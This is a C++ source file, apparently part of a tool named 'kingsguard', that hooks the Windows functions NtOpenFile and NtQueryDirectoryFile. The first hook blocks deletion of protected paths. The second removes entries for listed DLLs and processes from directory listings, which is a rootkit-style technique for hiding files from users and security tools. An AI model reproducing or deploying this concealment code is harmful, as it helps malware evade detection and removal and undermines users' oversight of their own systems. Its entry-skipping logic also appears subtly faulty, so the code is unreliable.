#include "kingsguard.h"

#if PATHLOCK
NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
{
    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 3)
    {
        if (CheckExistsW(std::wstring(ObjectAttributes->ObjectName->Buffer), PATH, false))
            return STATUS_ACCESS_DENIED;
    }

    return OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}
#endif

NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
    NTSTATUS status = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    if (status == STATUS_SUCCESS && FileInformationClass == FileIdBothDirectoryInformation)
    {
        for (PFILE_ID_BOTH_DIR_INFO pCurrent = (PFILE_ID_BOTH_DIR_INFO)FileInformation, pPrevious = NULL; pCurrent != NULL; pCurrent = (PFILE_ID_BOTH_DIR_INFO)((PBYTE)pCurrent + pCurrent->NextEntryOffset)) {
            wchar_t path[MAX_PATH];

            if (!CheckExistsW(std::wstring(pCurrent->FileName), DLL, false) && !CheckExistsW(std::wstring(pCurrent->FileName), PROCESSW, false))
                pPrevious = pCurrent;
            else if (pPrevious != NULL)
                pPrevious->NextEntryOffset = pCurrent->NextEntryOffset ? pPrevious->NextEntryOffset + pCurrent->NextEntryOffset : 0;
            if (!pCurrent->NextEntryOffset)
                break;
        }

    }
    return status;
}
